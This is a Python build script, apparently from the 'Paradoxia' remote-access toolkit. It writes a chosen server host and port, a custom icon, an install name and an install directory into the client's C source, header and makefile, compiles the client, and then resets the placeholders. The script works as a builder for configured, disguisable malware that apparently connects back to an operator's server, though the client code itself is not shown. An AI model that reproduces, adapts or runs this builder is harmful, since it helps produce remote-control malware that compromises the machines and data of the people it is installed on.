"""

Generate Client

"""
import os
import subprocess
import os
import subprocess


def inplace_change(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    try:
        with open(filename) as f:
            s = f.read()
            if old_string not in s:
                #print('"{old_string}" not found in {filename}.'.format(**locals()))
                return

        # Safely write the changed content, if found in the file
        with open(filename, 'w') as f:
            #print('Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()))
            s = s.replace(old_string, new_string)
            f.write(s)
    except FileNotFoundError:
        print("[x] File not found : " + filename)
    except Exception as e:
        print("[X] Error : " + str(e))
        

def Build(host, port, icon, outfile, install_name, install_dir):
    try:
        os.chdir("ParadoxiaClient/ParadoxiaClient")

        inplace_change("ParadoxiaClient.c", "{{serverhost}}", host)
        inplace_change("ParadoxiaClient.c", "{{serverport}}", port)
        inplace_change("paradoxia.h", "{{installname}}", install_name.strip())
        inplace_change("paradoxia.h", "{{installdir}}", install_dir.strip())
        inplace_change("makefile", "{{outfilehere}}", outfile)
        if(icon is not None):
            if(os.path.isfile(icon)):
                inplace_change("icon.rc", "{{iconhere}}", icon)
                subprocess.call(["make", "icon"], stderr=subprocess.STDOUT, stdout = subprocess.DEVNULL)

            else:
                print("[X] Icon not found : " + icon)
        else:
            subprocess.call(["make"], stderr=subprocess.STDOUT, stdout = subprocess.DEVNULL)


        if(os.path.isfile(outfile)):
            print("[+] Built : {x}".format(x = os.path.abspath(outfile)))
        else:
            print("[X] Error building Paradoxia Client.")

    except Exception as e:
        print("[x] Error : " + str(e))        

    inplace_change("ParadoxiaClient.c", host, "{{serverhost}}")
    inplace_change("ParadoxiaClient.c", port, "{{serverport}}")
    if(icon is not None):
        inplace_change("icon.rc",icon, "{{iconhere}}")
    inplace_change("makefile", outfile, "{{outfilehere}}")
    inplace_change("paradoxia.h",  install_name.strip(), "{{installname}}")
    inplace_change("paradoxia.h", install_dir.strip(), "{{installdir}}")
    os.chdir("..")
    os.chdir("..")